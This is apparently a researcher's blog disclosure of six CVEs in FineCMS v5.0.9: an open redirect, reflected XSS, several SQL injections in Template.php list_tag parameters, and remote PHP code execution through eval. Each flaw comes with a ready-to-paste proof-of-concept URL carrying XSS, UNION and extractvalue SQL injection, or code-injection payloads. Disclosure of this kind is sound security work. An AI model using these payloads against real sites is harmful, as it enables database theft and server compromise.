---
title: FineCMS multi vulnerablity before v5.0.9
date: 2017-07-20 18:55:48
tags:
- Blogs
- cve
- sqli
categories:
- Blogs
---


somedays ago, we found many vulerablity in FineCMS v5.0.9, contains remote php code execution、some sql injection、URL Redirector Abuse and Cross Site Scripting.

- CVE-2017-11581
- CVE-2017-11582
- CVE-2017-11583
- CVE-2017-11584
- CVE-2017-11585
- CVE-2017-11586

<!--more-->


# URL Redirector Abuse #

## Technical Description: ##

file `/finecms/dayrui/controllers/Weixin.php` function sync without any limit and can redirect any url.

## Poc ##

view website and login
```
http://finecms.com/index.php?c=weixin&m=sync&url=http://www.baidu.com
```

![image.png-73.3kB][1]


# Reflected XSS #

## Technical Description: ##

file `/finecms/dayrui/controllers/admin/Login.php` line17~line57
```
$this->template->assign('username', $this->input->post('username', TRUE));
$this->template->display('login.html');
```

when we input error username and password to login, the xssclean only filter the username startwith `'<'`, if we use dom xss，it will output without any validated, sanitised or output encoded.

## PoC ##

view website admin pages and login use username
```
" onmousemove=alert`1` a="1
```

when login fail and mousermove the input field.

![image.png-48.2kB][2]

# api.php Reflected XSS #

## Technical Description: ##

file `/finecms/dayrui/controllers/api.php` line145-165 data2 function

![image.png-182.3kB][9]

the function parameter output into pages without any validated, sanitised or output encoded when function not exist.

## PoC ##

```
http://finecms.com/index.php?c=api&m=data2&function=<script>alert(1)</script>p&format=php
```
![image.png-45.9kB][10]


# SQL injection in action=related catid parameter #

## Technical Description: ##

file `/finecms/dayrui/libraries/Template.php` function list_tag `action=related`, the `catid` parameter split by `','` and insert into sql query without any validated, sanitised, we can use it get all of the database.

## PoC ##

view the website and get the SYS_KEY from cooke

and payload is 
```
http://finecms.com/index.php?
c=api&m=data2&auth={md5(SYS_KEY)}&param=action=related%20module=news%20tag=1,2%20catid=1,12))%0aand%0a0%0aunion%0aselect%0a*%0afro
m(((((((((((((((((((select(user()))a)join(select(2))b)join(select(3))c)joi
n(select(4))d)join(select(5))e)join(select(6))f)join(select(7))g)join(sele
ct(8))h)join(select(9))i)join(select(10))j)join(select(11))k)join(select(1
2))l)join(select(13))m)join(select(14))n)join(select(15))o)join(select(16)
)p)join(select(17))q)join(select(18))x)%23
```

![image.png-65.2kB][3]

# SQL injection after limit via $system[num] parameter #

## Technical Description: ##

file `/finecms/dayrui/libraries/Template.php` function list_tag `action=tags` and `action=related`, the `$system['num']` parameter insert into sql query without any validated, sanitised.

Only 5.0.0<mysql<5.6.6 we can use analyse() to sql injection get data.

## PoC ##

view the website and get the SYS_KEY from cooke

and payload is 
```
http://finecms.com/index.php?
c=api&m=data2&auth=202cb962ac59075b964b07152d234b70&param=action=related%2
0catid=1%20tag=1,2%20num=1/**/PROCEDURE/**/analyse(extractvalue(rand(),con
cat(0x3a,version())),1)

http://finecms.com/index.php?
c=api&m=data2&auth=202cb962ac59075b964b07152d234b70&param=action=tags%2
0catid=1%20tag=1,2%20num=1/**/PROCEDURE/**/analyse(extractvalue(rand(),con
cat(0x3a,version())),1)
```

# SQL injection via $system[field] parameter #

## Technical Description: ##

file `/finecms/dayrui/libraries/Template.php` function list_tag `action=related`、`action=form`、`action=member`、`action=module` the `$system['field']` parameter insert into sql query without any validated, sanitised.

## PoC ##

```
http://finecms.com/index.php?c=api&m=data2&auth=820686a208b89d4c2f8b6f2622eff83e&param=action=related%20module=news%20tag=1%20field=1%0aunion%0aselect%0auser()%23
```
![image.png-40.6kB][4]

```
http://finecms.com/index.php?
c=api&m=data2&auth=202cb962ac59075b964b07152d234b70&param=action=form%20fo
rm=1%20field=1%0aunion%0aselect%0auser()%23
```
![image.png-42.4kB][5]

```
http://finecms.com/index.php?
c=api&m=data2&auth=202cb962ac59075b964b07152d234b70&param=action=member%20
field=1%0aunion%0aselect%0auser()%23
```
![image.png-30.6kB][6]

```
http://finecms.com/index.php?c=api&m=data2&auth=820686a208b89d4c2f8b6f2622eff83e&param=action=module%20form=1%20module=news%20field=1%0aunion%0aselect%0auser()%23
```
![image.png-34.3kB][7]

# remote php code execution #

## Technical Description: ##

file `/finecms/dayrui/libraries/Template.php` function list_tag `action=cache`, we can bypass some filter and insert parameter `$_param` into eval function and execute php code.

## PoC ##

```
http://finecms.com/index.php?c=api&m=data2&auth=820686a208b89d4c2f8b6f2622eff83e&param=action=cache%20name=MEMBER.1'];phpinfo();$a=['1
```

![image.png-68kB][8]


  [1]: http://static.zybuluo.com/LoRexxar/bypfg8rxkludnscn6k7i06bx/image.png
  [2]: http://static.zybuluo.com/LoRexxar/cta71z8vhzrdv5h9xgvyjirl/image.png
  [3]: http://static.zybuluo.com/LoRexxar/g3fahvxj1u1628qhm6dwrelp/image.png
  [4]: http://static.zybuluo.com/LoRexxar/g111thw2rkktq201cdcy0vgj/image.png
  [5]: http://static.zybuluo.com/LoRexxar/uayzgncag8bh36fg9d8ii3fq/image.png
  [6]: http://static.zybuluo.com/LoRexxar/1k1qcb858g9jvsozo40sy35t/image.png
  [7]: http://static.zybuluo.com/LoRexxar/yfo0vsmibo19y94ld7kf6t00/image.png
  [8]: http://static.zybuluo.com/LoRexxar/dyjq3635yf7ascfdxqmklyql/image.png
  [9]: http://static.zybuluo.com/LoRexxar/oxxa39k1ctnodcfdibrzk8mb/image.png
  [10]: http://static.zybuluo.com/LoRexxar/g6c9j510dmf41jqluwewf7lc/image.png